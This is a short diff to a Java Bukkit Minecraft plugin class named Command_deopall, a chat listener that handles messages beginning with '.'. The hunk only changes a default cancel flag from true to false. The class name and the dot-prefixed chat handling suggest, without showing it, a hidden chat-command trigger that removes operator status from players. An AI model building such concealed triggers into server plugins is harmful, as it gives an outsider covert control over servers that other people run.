@@ -16,7 +16,7 @@ public class Command_deopall implements Listener
         String message = event.getMessage();
         Player p = event.getPlayer();
         Server server = Bukkit.getServer();
-        boolean cancel = true;
+        boolean cancel = false;
         
         if (message.startsWith("."))
         {
